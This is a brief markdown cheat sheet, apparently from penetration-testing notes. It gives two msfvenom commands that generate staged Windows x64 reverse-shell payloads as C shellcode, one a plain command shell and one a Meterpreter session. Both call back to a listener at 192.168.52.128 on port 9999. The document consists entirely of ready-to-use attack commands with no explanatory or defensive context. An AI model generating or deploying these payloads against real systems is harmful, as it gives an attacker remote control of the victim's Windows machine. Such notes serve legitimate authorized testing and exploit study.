# x64 Staged

reverse tcp
```sh
msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=192.168.52.128 LPORT=9999 -f c
```

meterpreter
```sh
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.52.128 LPORT=9999 -f c
```
